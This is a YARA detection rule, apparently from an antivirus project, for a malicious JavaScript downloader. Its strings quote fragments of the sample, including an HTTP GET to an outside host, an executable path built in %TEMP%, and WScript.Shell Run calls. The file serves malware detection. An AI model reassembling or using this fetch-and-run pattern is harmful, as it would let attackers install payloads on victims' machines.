rule sig_20160329_6bef9104d00f5f4675424581557fabc1 {
  meta:
    description = "datamaliciousorder - file 20160329_6bef9104d00f5f4675424581557fabc1.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "dc62b6c762bd4fd5692349731ebf6b3c3d48f6dfcd23f8bdddf87b06d235286b"

  strings:
    $s1  = "Qu[v](\"GET\", \"http://zilton.com/o9qwp\", false);" fullword ascii
    $s2  = "function KF() {return y[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"ADMjpyzNF9K9DX7r.exe\";};" fullword ascii
    $s3  = "for (;;){WScript[g](j() * 11); if (Qu[\"readystate\"] >= 2 * 2) break;};" fullword ascii
    $s4  = "function LD(q, D0){lC = lC * 1; return q - D0;};" fullword ascii
    $s5  = "var y = function s() {return WScript[X](\"WScript.Shell\");}(), pr = 11;" fullword ascii
    $s6  = "function nU(){return \"\" + l;};" fullword ascii
    $s7  = "function YJ(l0){y[\"Run\"](l0, lC, lC);};" fullword ascii
    $s8  = "function Fz() {return ((o0 == true) && (o0 == d0)) ? 1 : lC;};" fullword ascii
    $s9  = "var J = new this[\"Date\"]();" fullword ascii
    $s10 = "function j(){return 22;};" fullword ascii
    $s11 = "function k(gF) {var pX = (1, 2, 3, 4, 5, gF); return pX;};" fullword ascii
    $s12 = "return LD(mR, n);" fullword ascii
    $s13 = "function D(){return X;};" fullword ascii
    $s14 = " while (yC){" fullword ascii
    $s15 = "function w()" fullword ascii
    $s16 = "o0 = true; " fullword ascii
    $s17 = "var o0 = false;" fullword ascii
    $s18 = "var d0 = false;" fullword ascii
    $s19 = "var AR = false;" fullword ascii
    $s20 = "d0 = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}